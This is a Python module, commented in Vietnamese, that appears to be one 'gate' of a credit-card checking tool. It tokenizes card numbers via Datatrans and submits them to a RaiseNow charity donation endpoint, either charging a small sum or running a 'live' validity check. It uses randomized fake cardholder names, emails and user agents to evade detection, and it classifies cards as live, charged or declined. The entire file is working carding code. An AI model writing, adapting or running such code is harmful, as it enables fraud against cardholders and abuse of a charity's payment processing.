import requests
import json
import random
import string
import logging
import time

# Khởi tạo logger cho module này
logger = logging.getLogger(__name__)

# --- Các hàm tiện ích ---
# Các hàm này được sao chép từ main.py để đảm bảo file hoạt động độc lập,
# tuân thủ cấu trúc hiện có của các file checker khác.

def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
    """
    Thực hiện một yêu cầu HTTP với cơ chế thử lại.

    Args:
        session: Đối tượng session của requests.
        method (str): Phương thức HTTP (ví dụ: 'get', 'post').
        url (str): URL của yêu cầu.
        max_retries (int): Số lần thử lại tối đa.
        cancellation_event (threading.Event): Sự kiện để hủy bỏ tác vụ.
        **kwargs: Các tham số khác cho hàm request (data, json, headers,...).

    Returns:
        tuple: (response, error_message)
    """
    last_exception = None
    for attempt in range(max_retries):
        # Kiểm tra nếu người dùng đã yêu cầu dừng
        if cancellation_event and cancellation_event.is_set():
            return None, "Operation cancelled by user"
        
        try:
            # Thực hiện yêu cầu
            response = session.request(method, url, **kwargs)
            return response, None # Trả về response nếu thành công
        except requests.exceptions.RequestException as e:
            last_exception = e
            wait_time = attempt + 1
            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
            time.sleep(wait_time) # Chờ trước khi thử lại
    
    # Trả về lỗi nếu tất cả các lần thử lại đều thất bại
    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
    logger.error(final_error_message)
    return None, final_error_message

def generate_random_string(length=8):
    """Tạo một chuỗi ngẫu nhiên gồm chữ và số."""
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def random_email():
    """Tạo một địa chỉ email ngẫu nhiên."""
    prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(8, 15)))
    domain = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    return f"{prefix}@{domain}.com"

def random_user_agent():
    """Tạo một chuỗi User-Agent ngẫu nhiên và thực tế."""
    chrome_major = random.randint(100, 138)
    chrome_build = random.randint(0, 6500)
    chrome_patch = random.randint(0, 250)
    webkit_major = random.randint(537, 605)
    webkit_minor = random.randint(36, 99)
    safari_version = f"{webkit_major}.{webkit_minor}"
    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
    return (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Safari/{safari_version}"
    )

# --- Hàm check chính cho Gate 10 ---

def check_card_gate10(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate10_mode, _get_charge_value, custom_charge_amount=None):
    """
    Logic cho Gate 10: Chế độ Charge 0.5$ Month hoặc Live Check.
    """
    gate10_mode = get_gate10_mode() # Lấy chế độ hiện tại (charge/live)
    try:
        user_agent = random_user_agent()

        # Tạo thông tin cá nhân ngẫu nhiên
        first_name = generate_random_string(random.randint(12, 20))
        last_name = generate_random_string(random.randint(10, 20))
        cardholder = f"{first_name} {last_name}"
        email = random_email()
        # Tạo message ngẫu nhiên theo yêu cầu
        message = generate_random_string(random.randint(10, 30))

        # --- BƯỚC 1: Lấy Token từ Datatrans ---
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_headers = {
            "Host": "pay.datatrans.com",
            "Accept": "*/*",
            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://pay.datatrans.com",
            "Pragma": "no-cache",
            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField?mode=TOKENIZE&merchantId=3000022877&fieldName=cardNumber&formId=&placeholder=0000%200000%200000%200000&ariaLabel=Card%20number&inputType=tel&version=2.0.0&fieldNames=cardNumber,cvv&instanceId=yuvwit0gc",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": user_agent,
            "X-Requested-With": "XMLHttpRequest",
        }
        # Dữ liệu gửi đi dưới dạng x-www-form-urlencoded
        tokenize_payload = f"mode=TOKENIZE&formId=250807190400178471&cardNumber={cc}&cvv={cvv}&paymentMethod=ECA&merchantId=3000022877&browserUserAgent={requests.utils.quote(user_agent)}&browserJavaEnabled=false&browserLanguage=vi-VN&browserColorDepth=24&browserScreenHeight=1152&browserScreenWidth=2048&browserTZ=-420"

        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
        
        # Xử lý lỗi từ yêu cầu lấy token
        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info

        # Kiểm tra các lỗi cụ thể từ response
        if "Card number not allowed in production" in token_response.text:
            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info

        # Phân tích JSON response để lấy transactionId
        try:
            token_data = token_response.json()
            if "error" in token_data and "message" in token_data.get("error", {}):
                 return 'decline', line, token_data["error"]["message"], bin_info
            transaction_id = token_data.get("transactionId")
            if not transaction_id:
                return 'decline', line, token_data.get("error", f"Unknown error at Tokenize: {token_response.text}"), bin_info
        except json.JSONDecodeError:
            if token_response.status_code != 200:
                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization", bin_info
            return 'error', line, f"Tokenize response was not JSON: {token_response.text}", bin_info

        # --- BƯỚC 2: Gửi yêu cầu đến RaiseNow (Charge hoặc Live) ---
        payment_headers = {
            "host": "api.raisenow.io",
            "accept": "application/json, text/plain, */*",
            "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5",
            "cache-control": "no-cache",
            "content-type": "application/json",
            "origin": "https://donate.raisenow.io",
            "pragma": "no-cache",
            "referer": "https://donate.raisenow.io/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": user_agent,
        }

        # Xây dựng payload dưới dạng dictionary
        payment_payload_dict = {
            "account_uuid": "377e94dd-0b4d-408e-9e68-5f6f3f1a0454",
            "test_mode": False,
            "create_supporter": False,
            "supporter": {"locale": "en", "first_name": first_name, "last_name": last_name, "email": email},
            "raisenow_parameters": {
                "analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,8000,10000]", "user_agent": user_agent},
                "solution": {"uuid": "91d8bd88-a1f2-48eb-b089-23d8f08dcfb3", "name": "Patenschaft", "type": "donate"},
                "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hpgqq?lng=en", "uuid": "self-service", "version": "2.16.0"},
                "integration": {"donation_receipt_requested": "false", "message": message}
            },
            "custom_parameters": {"campaign_id": "", "campaign_subid": "", "rnw_recurring_interval_name": "monthly", "rnw_recurring_interval_text": "Monthly"},
            "payment_information": {"brand_code": "eca", "cardholder": cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano, "transaction_id": transaction_id},
            "profile": "7307173a-2047-42b4-907a-7097ac083e90",
            "return_url": "https://donate.raisenow.io/hpgqq?lng=en&rnw-view=payment_result",
            "subscription": {
                "custom_parameters": {"campaign_id": "", "campaign_subid": "", "rnw_recurring_interval_name": "monthly", "rnw_recurring_interval_text": "Monthly"},
                "raisenow_parameters": {
                    "analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,8000,10000]", "user_agent": user_agent},
                    "solution": {"uuid": "91d8bd88-a1f2-48eb-b089-23d8f08dcfb3", "name": "Patenschaft", "type": "donate"},
                    "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hpgqq?lng=en", "uuid": "self-service", "version": "2.16.0"},
                    "integration": {"donation_receipt_requested": "false", "message": message}
                },
                "recurring_interval": "7 * *",
                "timezone": "Asia/Bangkok"
            }
        }

        # --- Xử lý theo chế độ CHARGE ---
        if gate10_mode == 'charge':
            charge_value = _get_charge_value('10', custom_charge_amount)
            payment_url = "https://api.raisenow.io/payments"
            payment_payload_dict["amount"] = {"currency": "EUR", "value": charge_value}

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload_dict, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info

            # Logic kiểm tra kết quả y hệt Gate 1
            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_{charge_value}', bin_info
            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
            elif '"3d_secure_2"' in response_text: return 'custom', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

        # --- Xử lý theo chế độ LIVE CHECK ---
        else:
            payment_url = "https://api.raisenow.io/payment-sources"
            payment_payload_dict["amount"] = {"currency": "EUR", "value": 50} # Giá trị mặc định cho live check

            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload_dict, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Payment Source Error: {error}", bin_info
            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info

            response_text = payment_response.text
            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, 'GATE_DIED: Forbidden', bin_info
            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
            else: return 'unknown', line, response_text, bin_info

    except Exception as e:
        logger.error(f"Unknown error in Gate 10 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 10 System Error: {e}", bin_info
